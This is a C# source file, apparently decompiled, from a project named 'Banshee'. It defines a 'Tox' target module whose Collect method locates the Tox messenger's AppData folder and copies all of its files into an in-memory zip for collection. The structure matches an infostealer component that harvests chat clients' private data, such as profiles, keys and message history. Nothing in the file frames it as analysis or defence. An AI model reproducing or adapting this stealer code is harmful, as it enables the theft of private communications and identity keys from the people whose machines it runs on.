﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Messangers
{
	// Token: 0x0200004B RID: 75
	public class Tox : ITarget
	{
		// Token: 0x060000B0 RID: 176 RVA: 0x00005E18 File Offset: 0x00005E18
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Tox");
			if (Directory.Exists(text))
			{
				string text2 = "Tox";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Tox";
				zip.AddDirectoryFiles(text, ZipPath.Messengers(text2), true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
